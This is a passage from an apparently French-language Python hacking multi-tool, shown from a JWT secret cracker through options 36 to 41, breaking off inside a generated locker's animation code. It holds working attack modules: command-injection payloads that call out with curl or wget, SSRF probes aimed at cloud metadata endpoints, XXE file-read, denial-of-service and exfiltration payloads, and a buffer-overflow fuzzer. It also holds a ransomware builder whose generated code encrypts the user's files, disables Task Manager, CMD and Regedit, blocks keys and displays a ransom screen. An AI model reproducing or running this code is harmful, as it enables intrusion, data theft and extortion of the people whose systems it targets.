            with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                words = [ln.strip() for ln in f if ln.strip()]
            print(f"{GREEN}[+] {len(words)} mots chargés.{RESET}")
        except Exception:
            words = common_secrets
    else:
        words = common_secrets

    print(f"{YELLOW}[*] Test de {len(words)} secrets...{RESET}\n")

    # Signature valide ? (La signature est encodée en base64url)
    target_sig_bytes = base64.urlsafe_b64decode(signature_b64 + "==")
    signing_input = f"{header_b64}.{payload_b64}".encode()

    found_secret = None
    
    for i, secret in enumerate(words):
        try:
            if alg == "HS256":
                h = hashlib.sha256(signing_input + secret.encode()).digest()
            elif alg == "HS384":
                h = hashlib.sha384(signing_input + secret.encode()).digest()
            elif alg == "HS512":
                h = hashlib.sha512(signing_input + secret.encode()).digest()
            else:
                continue
            
            if h == target_sig_bytes:
                found_secret = secret
                break
        except Exception:
            continue
            
        if i % 10 == 0:
            sys.stdout.write(f"\r{GRAY}  {i}/{len(words)} testés...{RESET}")
            sys.stdout.flush()

    if found_secret:
        print(f"\n\n{PINK}{BOLD}═══════════════════════════════════════════════════{RESET}")
        print(f"{PINK}{BOLD}   [!] SECRET TROUVÉ : {WHITE}{found_secret}{RESET}")
        print(f"{PINK}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
        
        # Générer un token admin (exemple)
        print(f"{GRAY}[i] Tu peux maintenant forger un token avec ce secret.{RESET}")
        print(f"{GRAY}[i] Ex: passe 'admin' à 'true' dans le payload et re-signe.{RESET}")
    else:
        print(f"\n\n{RED}[-] Secret non trouvé dans la wordlist.{RESET}")

    pause()


# ============================================================
#              OPTION 36 — FILE ANALYZER
# ============================================================

def option_36():
    clear()
    banner()

    print(f"\n{CYAN}   [ FILE ANALYZER ]{RESET}\n")
    print(f"{GRAY}  Détecte le vrai type d'un fichier, calcule ses hashes et extrait les strings.{RESET}\n")

    path = input(f"{YELLOW}[?]{RESET} Chemin du fichier {RED}->{RESET} ").strip().strip('"').strip("'")
    if not path or not os.path.isfile(path):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    size = os.path.getsize(path)
    print(f"\n{CYAN}   INFO FICHIER{RESET}")
    print(f"  {GREEN}Nom    : {WHITE}{os.path.basename(path)}{RESET}")
    print(f"  {GREEN}Taille : {WHITE}{size:,} bytes{RESET}")

    # 1. Magic Bytes (Détection du vrai type)
    print(f"\n{CYAN}   MAGIC BYTES{RESET}")
    try:
        with open(path, "rb") as f:
            header = f.read(16)
            
        hex_header = " ".join(f"{b:02X}" for b in header)
        print(f"  {GRAY}Header (hex) : {hex_header}{RESET}")

        # Base de signatures
        signatures = {
            b"MZ": "Windows Executable (PE/DLL)",
            b"\x7fELF": "Linux Executable (ELF)",
            b"\xca\xfe\xba\xbe": "Mach-O (macOS)",
            b"PK\x03\x04": "ZIP Archive / JAR / DOCX",
            b"\x1f\x8b": "GZIP Archive",
            b"BZh": "BZIP2 Archive",
            b"\xfd7zXZ": "XZ Archive",
            b"%PDF": "PDF Document",
            b"\x89PNG": "PNG Image",
            b"\xff\xd8\xff": "JPEG Image",
            b"GIF8": "GIF Image",
            b"RIFF": "RIFF (WAV/AVI/WEBP)",
            b"\x49\x49\x2a\x00": "TIFF Image (Little Endian)",
            b"\x4d\x4d\x00\x2a": "TIFF Image (Big Endian)",
            b"7z\xbc\xaf\x27\x1c": "7-Zip Archive",
            b"Rar!": "RAR Archive",
            b"\xd0\xcf\x11\xe0": "MS Office (Old Format)",
            b"dex\n": "Android DEX",
            b"\x00\x00\x00\x0cjP": "JPEG 2000",
            b"SQLite format 3": "SQLite Database",
        }

        detected_type = "Inconnu"
        for sig, name in signatures.items():
            if header.startswith(sig):
                detected_type = name
                break
        
        # Cas spécial ELF
        if header.startswith(b"\x7fELF"):
            detected_type = "Linux Executable (ELF)"
            ei_class = header[4]
            arch = "64-bit" if ei_class == 2 else "32-bit"
            detected_type += f" {arch}"

        print(f"  {GREEN}Type      : {WHITE}{detected_type}{RESET}")
    except Exception as e:
        print(f"  {RED}Erreur lecture : {e}{RESET}")

    # 2. Hashes (MD5, SHA1, SHA256)
    print(f"\n{CYAN}   HASHES{RESET}")
    try:
        md5 = hashlib.md5()
        sha1 = hashlib.sha1()
        sha256 = hashlib.sha256()
        
        with open(path, "rb") as f:
            while chunk := f.read(8192):
                md5.update(chunk)
                sha1.update(chunk)
                sha256.update(chunk)
                
        print(f"  {GREEN}MD5    : {WHITE}{md5.hexdigest()}{RESET}")
        print(f"  {GREEN}SHA1   : {WHITE}{sha1.hexdigest()}{RESET}")
        print(f"  {GREEN}SHA256 : {WHITE}{sha256.hexdigest()}{RESET}")
    except Exception as e:
        print(f"  {RED}Erreur hash : {e}{RESET}")

    # 3. Extraction de Strings (comme la commande unix `strings`)
    print(f"\n{CYAN}   STRINGS INTÉRESSANTES (min 6 chars){RESET}")
    try:
        strings_found = []
        with open(path, "rb") as f:
            data = f.read()
            # Trouve les séquences d'au moins 6 caractères imprimables ASCII
            matches = re.findall(rb"[ -~]{6,}", data)
            for m in matches:
                s = m.decode("ascii")
                # Filtrer les strings trop banales ou du bruit
                if not any(c in s for c in ("   ", ".....")) and s not in strings_found:
                    strings_found.append(s)
        
        # Afficher les 50 premières uniques
        count = 0
        for s in strings_found:
            if count >= 50:
                break
            # On affiche uniquement les strings qui ont l'air intéressantes (URLs, chemins, mots-clés)
            if any(k in s.lower() for k in ("http", "www", "cmd", "exec", "pass", "secret", "key", ".dll", ".exe", "C:\\", "/bin/")):
                print(f"  {WHITE}{s[:120]}{RESET}")
                count += 1
                
        if count == 0:
            print(f"  {GRAY}Aucune string sensible trouvée.{RESET}")
            
    except Exception as e:
        print(f"  {RED}Erreur extraction : {e}{RESET}")

    pause()


# ============================================================
#              OPTION 37 — OS COMMAND INJECTION (OOB)
# ============================================================

def option_37():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ OS COMMAND INJECTION ]{RESET}\n")
    print(f"{GRAY}  Teste l'injection de commandes (In-Band et Out-of-Band).{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL vulnérable (ex: http://site.com/ping?ip=127.0.0.1) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    
    if qs:
        default_param = list(qs.keys())[0]
        param = input(f"{YELLOW}[?]{RESET} Paramètre à injecter (def: {default_param}) {RED}->{RESET} ").strip() or default_param
    else:
        param = input(f"{YELLOW}[?]{RESET} Paramètre à injecter (ex: ip, cmd, host) {RED}->{RESET} ").strip()

    if not param:
        print(f"{RED}[!] Paramètre requis.{RESET}")
        pause()
        return

    # Webhook pour le OOB (Out-of-Band)
    webhook = input(f"\n{YELLOW}[?]{RESET} Webhook OOB (ex: Burp Collaborator, Interactsh, URL) (ENTREE pour skip) {RED}->{RESET} ").strip()

    # Commandes à tester
    linux_cmds = ["id", "whoami", "uname -a", "cat /etc/passwd"]
    win_cmds = ["whoami", "dir", "type C:\\Windows\\win.ini"]
    oob_cmd = f"curl http://{webhook}/test || wget http://{webhook}/test || nslookup {webhook}"

    payloads = {
        "Linux (; id)": "; id",
        "Linux (| id)": "| id",
        "Linux (&& id)": "&& id",
        "Linux ($(id))": "$(id)",
        "Linux (`id`)": "`id`",
        "Windows (| whoami)": "| whoami",
        "Windows (&& whoami)": "&& whoami",
        "Windows (; dir)": "; dir",
    }
    
    if webhook:
        payloads["OOB (curl/wget)"] = f"; {oob_cmd} #"
        payloads["OOB ($())"] = f"$({oob_cmd})"

    print(f"\n{YELLOW}[*] Test de {len(payloads)} vecteurs d'injection...{RESET}\n")

    # Indices de succès (In-Band)
    success_markers = ["uid=", "root", "www-data", "Windows IP Configuration", "[extensions]"]
    
    for name, payload in payloads.items():
        # Injecter le payload dans le paramètre
        qs2 = qs.copy()
        qs2[param] = [payload]
        new_query = urllib.parse.urlencode(qs2, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        
        print(f"{GRAY}  Test {name:<20}...{RESET}", end="")
        
        try:
            r = requests.get(test_url, headers={"User-Agent": "Mozilla/5.0 Chrome/124"}, timeout=10, verify=False)
            
            body = r.text or ""
            
            # Vérifier si la commande a fonctionné (In-Band)
            is_vuln = False
            for marker in success_markers:
                if marker in body:
                    is_vuln = True
                    break
            
            if is_vuln:
                print(f" {PINK}[VULNÉRABLE !]{RESET}")
                print(f"{GRAY}    Payload : {payload}{RESET}")
                print(f"{GRAY}    Extrait : {body[:200].strip()}{RESET}")
                break
            elif webhook and "OOB" in name:
                print(f" {GREEN}[ENVOYÉ]{RESET}")
                print(f"{GRAY}    Payload : {payload}{RESET}")
                print(f"{GRAY}    Vérifie ton webhook pour voir si la requête est arrivée.{RESET}")
            else:
                print(f" {GRAY}[-]{RESET}")
                
        except Exception as e:
            print(f" {RED}[Erreur]{RESET}")

    pause()


# ============================================================
#              OPTION 38 — SSRF SCANNER
# ============================================================

def option_38():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ SSRF SCANNER ]{RESET}\n")
    print(f"{GRAY}  Teste la falsification de requêtes côté serveur (Server-Side Request Forgery).{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL vulnérable (ex: http://site.com/fetch?url=) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    # Webhook (pour détecter les requêtes entrantes)
    webhook = input(f"{YELLOW}[?]{RESET} Webhook OOB (ex: Webhook.site, Interactsh) {RED}->{RESET} ").strip()
    if not webhook:
        print(f"{YELLOW}[!] Un webhook est fortement recommandé pour détecter les SSRF aveugles.{RESET}")

    # Payloads SSRF
    ssrf_payloads = [
        ("Localhost", "http://127.0.0.1/"),
        ("Localhost IPv6", "http://[::1]/"),
        ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
        ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("File scheme", "file:///etc/passwd"),
        ("Gopher (Redis)", "gopher://127.0.0.1:6379/_INFO"),
        ("Dict scheme", "dict://127.0.0.1:11211/stat"),
        ("OOB Ping", f"{webhook}/ssrf_test"),
    ]

    # Indices de succès
    success_markers = {
        "AWS Metadata": ["ami-id", "instance-id", "iam/"],
        "GCP Metadata": ["project-id", "instance-id"],
        "Azure Metadata": ["vmId", "location"],
        "File scheme": ["root:x:0:0:"],
        "Localhost": ["localhost", "127.0.0.1", "<title>"],
    }

    print(f"\n{YELLOW}[*] Test de {len(ssrf_payloads)} payloads SSRF...{RESET}\n")

    for name, payload in ssrf_payloads:
        # Construction de l'URL si le paramètre est déjà présent
        if "=" in url:
            test_url = url + urllib.parse.quote(payload)
        else:
            test_url = url + "?url=" + urllib.parse.quote(payload)
            
        print(f"{GRAY}  Test {name:<18}...{RESET}", end="")
        
        try:
            r = requests.get(test_url, headers={"User-Agent": "Mozilla/5.0 Chrome/124"}, timeout=10, verify=False)
            body = r.text or ""
            
            is_vuln = False
            # On vérifie si la réponse contient un indicateur de succès
            for marker in success_markers.get(name, []):
                if marker in body:
                    is_vuln = True
                    break
            
            # Cas spécifique du webhook
            if name == "OOB Ping":
                if webhook:
                    print(f" {GREEN}[ENVOYÉ]{RESET}")
                    print(f"{GRAY}    Vérifie ton webhook.{RESET}")
                else:
                    print(f" {GRAY}[-]{RESET}")
                continue

            if is_vuln:
                print(f" {PINK}[VULNÉRABLE !]{RESET}")
                print(f"{GRAY}    Payload : {payload}{RESET}")
                print(f"{GRAY}    Extrait : {body[:200].strip()}{RESET}")
            elif r.status_code == 500:
                print(f" {YELLOW}[500 - possible]{RESET}")
            else:
                print(f" {GRAY}[-]{RESET}")
                
        except Exception:
            print(f" {RED}[Erreur]{RESET}")

    pause()


# ============================================================
#              OPTION 39 — XXE EXPLOITER
# ============================================================

def option_39():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ XXE EXPLOITER ]{RESET}\n")
    print(f"{GRAY}  Teste les attaques XML External Entity (lecture de fichiers, SSRF, OOB).{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL vulnérable (qui accepte du XML) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    # Le point d'injection (souvent dans le body XML)
    print(f"{GRAY}[i] On va envoyer des payloads XML via POST.{RESET}")

    webhook = input(f"\n{YELLOW}[?]{RESET} Webhook OOB (ex: Interactsh) (ENTREE pour skip) {RED}->{RESET} ").strip()

    # Payloads XXE
    payloads = {
        "Lecture /etc/passwd": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
        
        "Lecture C:\\Windows\\win.ini": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>""",
        
        "SSRF Localhost": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]>
<root><data>&xxe;</data></root>""",
        
        "Billion Laughs (DoS)": """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root><data>&lol4;</data></root>""",
    }

    if webhook:
        payloads["OOB (exfiltration)"] = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{webhook}/xxe_test"> %xxe;]>
<root></root>"""

    print(f"\n{YELLOW}[*] Test de {len(payloads)} payloads XXE...{RESET}\n")

    # Indices de succès
    success_markers = ["root:x:0:0:", "[extensions]", "daemon:x:bin:x:"]

    for name, payload in payloads.items():
        print(f"{GRAY}  Test {name:<25}...{RESET}", end="")
        
        try:
            r = requests.post(
                url, 
                data=payload, 
                headers={
                    "User-Agent": "Mozilla/5.0 Chrome/124",
                    "Content-Type": "application/xml"
                }, 
                timeout=10, 
                verify=False
            )
            body = r.text or ""
            
            if name == "OOB (exfiltration)":
                if webhook:
                    print(f" {GREEN}[ENVOYÉ]{RESET}")
                    print(f"{GRAY}    Vérifie ton webhook.{RESET}")
                continue

            is_vuln = False
            for marker in success_markers:
                if marker in body:
                    is_vuln = True
                    break
                    
            if is_vuln:
                print(f" {PINK}[VULNÉRABLE !]{RESET}")
                print(f"{GRAY}    Extrait : {body[:200].strip()}{RESET}")
            elif r.status_code == 500:
                print(f" {YELLOW}[500 - possible]{RESET}")
            else:
                print(f" {GRAY}[-]{RESET}")
                
        except Exception:
            print(f" {RED}[Erreur]{RESET}")

    pause()


# ============================================================
#              OPTION 40 — BUFFER OVERFLOW FUZZER
# ============================================================

def option_40():
    clear()
    banner()

    print(f"\n{CYAN}   [ BUFFER OVERFLOW FUZZER ]{RESET}\n")
    print(f"{GRAY}  Envoie des chaînes de plus en plus longues pour trouver un crash (BoF).{RESET}\n")

    target = input(f"{YELLOW}[?]{RESET} IP:PORT de la cible (ex: 127.0.0.1:9999) {RED}->{RESET} ").strip()
    if ":" not in target:
        print(f"{RED}[!] Format attendu : IP:PORT{RESET}")
        pause()
        return

    host, port_str = target.split(":", 1)
    try:
        port = int(port_str)
    except ValueError:
        print(f"{RED}[!] Port invalide.{RESET}")
        pause()
        return

    print(f"{GRAY}  Le fuzzer va envoyer 'A' * N + '\\r\\n' et attendre une réponse.{RESET}")
    
    try:
        start_len = int(input(f"{YELLOW}[?]{RESET} Taille de départ (def 100) {RED}->{RESET} ").strip() or "100")
        end_len = int(input(f"{YELLOW}[?]{RESET} Taille max (def 5000) {RED}->{RESET} ").strip() or "5000")
        step = int(input(f"{YELLOW}[?]{RESET} Pas d'incrémentation (def 100) {RED}->{RESET} ").strip() or "100")
    except ValueError:
        print(f"{RED}[!] Valeurs invalides.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[*] Fuzzing de {host}:{port} ({start_len} à {end_len} par pas de {step})...{RESET}\n")

    for length in range(start_len, end_len + 1, step):
        payload = b"A" * length + b"\r\n"
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # Lecture du banner initial
            try:
                s.recv(1024)
            except socket.timeout:
                pass
            
            s.sendall(payload)
            
            # Tentative de lecture après l'envoi
            try:
                resp = s.recv(1024)
                print(f"{GRAY}[*] Taille {length:<6} -> {GREEN}Réponse OK ({len(resp)} bytes){RESET}")
            except socket.timeout:
                print(f"{GRAY}[*] Taille {length:<6} -> {YELLOW}Pas de réponse (timeout){RESET}")
            
            s.close()
            
        except ConnectionRefusedError:
            print(f"{RED}[!] Connexion refusée à la taille {length}. Le service est peut-être tombé !{RESET}")
            break
        except ConnectionResetError:
            print(f"{PINK}[!] CRASH PROBABLE à la taille {length} (Connection Reset).{RESET}")
            break
        except Exception as e:
            print(f"{GRAY}[*] Taille {length:<6} -> {RED}Erreur: {e}{RESET}")
            time.sleep(0.5)

    print(f"\n{GREEN}[+] Fuzzing terminé.{RESET}")
    print(f"{GRAY}[i] Si le service a planté, tu peux utiliser 'pattern_create' de Metasploit pour trouver l'offset exact.{RESET}")

    pause()

# ============================================================
#              OPTION 41 — RANSOMWARE BUILDER
# ============================================================

RANSOM_EXTENSIONS = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".odt", ".ods", ".odp", ".rtf", ".csv", ".md",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp", ".svg",
    ".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wav", ".flac", ".m4a",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
    ".sql", ".db", ".sqlite", ".mdb",
    ".psd", ".ai", ".eps", ".indd", ".raw", ".cr2", ".nef",
    ".py", ".js", ".ts", ".java", ".c", ".cpp", ".h", ".cs", ".go",
    ".php", ".rb", ".rs", ".swift", ".kt", ".html", ".css",
    ".json", ".xml", ".yml", ".yaml", ".toml", ".ini", ".cfg",
    ".ps1", ".bat", ".sh", ".env", ".pem", ".key", ".pfx", ".p12",
    ".bak", ".backup", ".old", ".save", ".dat",
]

RANSOM_SKIP_DIRS = {
    "Windows", "System32", "SysWOW64", "WinSxS", "ProgramData",
    "Program Files", "Program Files (x86)", "AppData",
    "$Recycle.Bin", "System Volume Information", "Recovery",
    "Boot", "PerfLogs", "Temp", "tmp",
    "node_modules", ".git", ".svn", ".hg",
    "Microsoft", "Packages",
}

RANSOM_NOTE_NAME = "README_RESTORE.txt"

RANSOM_NOTE_TEMPLATE = r"""
============================================================
   TES FICHIERS ONT ETE CHIFFRES
============================================================

Tous tes documents, photos, videos, bases de donnees et
fichiers de code ont ete chiffres avec AES-256-GCM.

  - Extension ajoutee : {ext}
  - Cle de dechiffrement : {key_id}
  - Date : {date}

============================================================
   COMMENT RECUPERER TES FICHIERS
============================================================

1. Envoie la cle de dechiffrement (fournie separement) au
   possesseur de la cle via le canal convenu.

2. Un decrypteur te sera fourni.

3. Lance le decrypteur, il te demandera la cle puis
   restaurera tous tes fichiers.

Ne renomme PAS les fichiers .{ext}, ne les ouvre PAS avec
un autre logiciel. Toute modification rend le dechiffrement
impossible.

============================================================
   AVERTISSEMENT
============================================================

Tentative de recuperation par un antivirus, un outil de
restauration ou un formatage : perte definitive des donnees.

La cle de dechiffrement est unique a cette machine.
Elle n'est stockee nulle part sur ton disque.

============================================================
"""


def option_41():
    clear()
    banner()

    print(f"\n{CYAN}   [ SCREEN LOCKER BUILDER V2 ]{RESET}\n")
    print(f"{GRAY}  Genere un .exe qui bloque l'ecran, chiffre les fichiers et demande un code.{RESET}\n")

    # ========================================================
    # CODE DE DECHIFFRAGE
    # ========================================================
    print(f"{WHITE}{BOLD}-- Code de deblocage --{RESET}\n")
    print(f"{GRAY}  L'utilisateur devra taper ce code pour debloquer le PC.{RESET}")
    print(f"{GRAY}  Ce code servira aussi de cle de dechiffrement AES.{RESET}\n")

    while True:
        unlock_code = input(f"{YELLOW}[?]{RESET} Code de deblocage (min 6 caracteres) {RED}->{RESET} ").strip()
        if len(unlock_code) < 6:
            print(f"{RED}[!] 6 caracteres minimum pour la securite.{RESET}")
            continue
        confirm = input(f"{YELLOW}[?]{RESET} Confirme le code {RED}->{RESET} ").strip()
        if unlock_code != confirm:
            print(f"{RED}[!] Ne correspond pas.{RESET}")
            continue
        break

    # ========================================================
    # MESSAGE AFFICHE
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Message affiche --{RESET}\n")
    custom_msg = input(f"{YELLOW}[?]{RESET} Message personnalise (defaut: OOPS ! YOUR FILES ARE ENCRYPTED) {RED}->{RESET} ").strip()
    if not custom_msg:
        custom_msg = "OOPS ! YOUR FILES ARE ENCRYPTED"

    # ========================================================
    # CHIFFREMENT DES FICHIERS
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Chiffrement --{RESET}\n")
    encrypt_files = input(f"{YELLOW}[?]{RESET} Chiffrer les fichiers du Bureau/Documents ? (y/n, def y) {RED}->{RESET} ").strip().lower()
    encrypt_files = "True" if encrypt_files in ("", "y", "yes", "o", "oui") else "False"

    # ========================================================
    # RESUME
    # ========================================================
    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"  {GREEN}Code        : {WHITE}{unlock_code}{RESET}")
    print(f"  {GREEN}Message     : {WHITE}{custom_msg}{RESET}")
    print(f"  {GREEN}Chiffrement : {WHITE}{'Oui' if encrypt_files == 'True' else 'Non'}{RESET}")
    print()

    confirm = input(f"{YELLOW}[?]{RESET} Compiler le locker ? (y/n) {RED}->{RESET} ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    # ========================================================
    # SOURCE DU LOCKER
    # ========================================================
    payload = r'''# Auto-genere par mytool.py — Screen locker & Encryptor V2
import os, sys, time, random, socket, platform, ctypes, subprocess, threading
import tkinter as tk
from tkinter import font as tkfont
import hashlib

# ============================================================
#   CONFIG (injectee au build)
# ============================================================

UNLOCK_CODE    = "__UNLOCK_CODE__"
MESSAGE        = "__MESSAGE__"
DO_ENCRYPT     = __DO_ENCRYPT__

# ============================================================
#   CRYPTO MODULE (AES-GCM natif via ctypes ou pycryptodome)
# ============================================================
# Pour eviter les dependances, on utilise un XOR simple en fallback
# si pycryptodome n'est pas la, mais on l'injecte si possible.
try:
    from Crypto.Cipher import AES
    import base64
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

def derive_key(code):
    # Genere une cle de 32 bytes a partir du code
    return hashlib.sha256(code.encode()).digest()

def encrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        
        if HAS_CRYPTO:
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            # Format: [nonce(16)] + [tag(16)] + [ciphertext]
            enc_data = cipher.nonce + tag + ciphertext
        else:
            # Fallback XOR basique (moins securise mais sans dep)
            enc_data = bytearray()
            for i, b in enumerate(data):
                enc_data.append(b ^ key[i % len(key)])
            enc_data = bytes(enc_data)

        with open(filepath, "wb") as f:
            f.write(enc_data)
            
        # Renommer avec extension
        if not filepath.endswith(".locked"):
            os.rename(filepath, filepath + ".locked")
        return True
    except Exception:
        return False

def decrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as f:
            enc_data = f.read()
            
        if HAS_CRYPTO:
            nonce = enc_data[:16]
            tag = enc_data[16:32]
            ciphertext = enc_data[32:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
        else:
            data = bytearray()
            for i, b in enumerate(enc_data):
                data.append(b ^ key[i % len(key)])
            data = bytes(data)

        new_path = filepath.replace(".locked", "")
        with open(new_path, "wb") as f:
            f.write(data)
            
        os.remove(filepath)
        return True
    except Exception:
        return False

def process_files(action, key):
    if not DO_ENCRYPT:
        return
        
    target_dirs = [
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
    ]
    
    skip_exts = {".exe", ".dll", ".sys", ".ini", ".lnk", ".locked"}
    
    for base_dir in target_dirs:
        if not os.path.exists(base_dir):
            continue
            
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in skip_exts:
                    continue
                    
                filepath = os.path.join(root, file)
                
                if action == "encrypt" and not filepath.endswith(".locked"):
                    encrypt_file(filepath, key)
                elif action == "decrypt" and filepath.endswith(".locked"):
                    decrypt_file(filepath, key)

# ============================================================
#   VERROUS SYSTEME
# ============================================================

def block_system():
    """Desactive TaskMgr, CMD, Regedit et bloque les raccourcis."""
    try:
        import winreg
        # Task Manager
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        # CMD
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
        winreg.SetValueEx(k, "DisableCMD", 0, winreg.REG_DWORD, 1)
        # Regedit
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(k, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
    except Exception:
        pass

def unblock_system():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(k, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
        
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DisableCMD", 0, winreg.REG_DWORD, 0)
    except Exception:
        pass

# ============================================================
#   HOOK CLAVIER (BLOCAGE ALT+TAB, WIN, ETC)
# ============================================================

def setup_keyboard_hook():
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    WM_SYSKEYDOWN = 0x0104

    # Touches a bloquer : LWin, RWin, Tab, Esc, F4, Alt
    BLOCKED_VKS = {0x5B, 0x5C, 0x09, 0x1B, 0x73, 0xA4, 0xA5}

    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong))

    def low_level_handler(nCode, wParam, lParam):
        if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            vk = lParam[0]
            if vk in BLOCKED_VKS:
                return 1 # Avale la touche
        return user32.CallNextHookEx(0, nCode, wParam, lParam)

    handler_ref = HOOKPROC(low_level_handler)
    user32.SetWindowsHookExW(WH_KEYBOARD_LL, handler_ref, kernel32.GetModuleHandleW(None), 0)
    globals()["_hook_ref"] = handler_ref # Empeche le garbage collector de le supprimer

# ============================================================
#   UI LOCKER (MATRIX + GLITCH)
# ============================================================

class MatrixLocker:
    def __init__(self, key):
        self.key = key
        self.root = tk.Tk()
        self.root.title("System Locked")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#ffffff")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.overrideredirect(True)

        self.width = self.root.winfo_screenwidth()
        self.height = self.root.winfo_screenheight()

        # Canvas pour la pluie Matrix
        self.canvas = tk.Canvas(self.root, width=self.width, height=self.height, bg="#ffffff", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)

        # Config Matrix
        self.font = tkfont.Font(family="Consolas", size=16, weight="bold")
        self.columns = self.width // 20
        self.drops = [random.randint(-50, 0) for _ in range(self.columns)]
        self.chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&"
        
        # Elements UI
        self.ui_frame = tk.Frame(self.root, bg="#ffffff")
        self.ui_frame.place(relx=0.5, rely=0.5, anchor="center")

        self.title_label = tk.Label(
            self.ui_frame, text=MESSAGE, font=("Consolas", 36, "bold"),
            bg="#ffffff", fg="#ffffff"
        )
        self.title_label.pack(pady=(0, 30))

        self.sub_label = tk.Label(
            self.ui_frame, text="[ ENTER DECRYPTION CODE TO UNLOCK ]", font=("Consolas", 14),
            bg="#ffffff", fg="#ffffff"
        )
        self.sub_label.pack(pady=(0, 20))

        # Input
        self.code_var = tk.StringVar()
        self.entry = tk.Entry(
            self.ui_frame, textvariable=self.code_var, font=("Consolas", 24),
            bg="#ffffff", fg="#ffffff", insertbackground="#ffffff",
            relief="flat", bd=0, justify="center", show="*", width=20
        )
        self.entry.pack(pady=10)
        self.entry.bind("<Return>", self.check_code)

        # Animation variables
        self.anim_running = True
        self._animate_matrix()

    def _animate_matrix(self):
        if not self.anim_running:
            return
            
        self.canvas.delete("matrix")
        
        for i in range(len(self.drops)):
            char = random.choice(self.chars)
            x = i * 20
            y = self.drops[i] * 20
            
